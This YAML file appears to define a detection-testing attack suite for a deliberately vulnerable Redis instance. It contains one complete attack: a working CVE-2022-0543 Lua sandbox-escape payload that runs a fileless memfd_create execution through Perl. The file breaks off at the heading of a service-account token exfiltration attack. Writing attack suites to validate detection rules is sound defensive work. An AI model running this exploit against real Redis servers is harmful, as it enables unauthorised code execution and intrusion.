apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: redis-full-attack-suite
  description: >-
    Comprehensive Redis attack suite (12 attacks) targeting a vulnerable
    Redis 7.2.10 instance with CVE-2022-0543 (Lua sandbox escape via
    package.loadlib / io.popen). Each attack has inline expectedDetections
    for precise per-attack alert attribution via the AlertLedger.
target:
  service: redis
  namespace: redis
  port: 6379
  protocol: redis

attacks:
  # ─── Attack 1: Fileless Execution via memfd_create (R1005) ───────────────
  - name: fileless-memfd-exec
    type: fileless
    redis:
      eval: |
        local io_mod = nil
        pcall(function()
          if type(io) == 'table' and io.popen then io_mod = io end
        end)
        if not io_mod then
          pcall(function()
            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
            if loader then io_mod = loader() end
          end)
        end
        if not io_mod then return 'sandbox_blocked' end
        -- memfd_create: syscall 279 on aarch64, 319 on x86_64. Try aarch64 first.
        local cmd = "perl -e 'my $n=\"bob\\0\";my $fd=syscall(279,$n,0);if($fd<0){$fd=syscall(319,$n,0);}die if $fd<0;open(my $s,\"<:raw\",\"/bin/cat\");open(my $d,\">&=\",$fd);binmode $d;my $b;while(read($s,$b,8192)){print $d $b}close $s;exec{\"/proc/self/fd/$fd\"}\"cat\",\"/etc/hostname\"'"
        local f = io_mod.popen(cmd)
        if not f then return 'popen_failed' end
        local out = f:read('*a')
        f:close()
        return 'fileless:' .. out
    successIndicators:
      - responseContains: "fileless:"
    expectedDetections:
      - attackType: fileless
        ruleID: R1005
        ruleName: "Fileless execution detected"
        containerName: redis

  # ─── Attack 2: SA Token Exfiltration (R0006) ────────────────────────────
  - name: sa-token-exfil
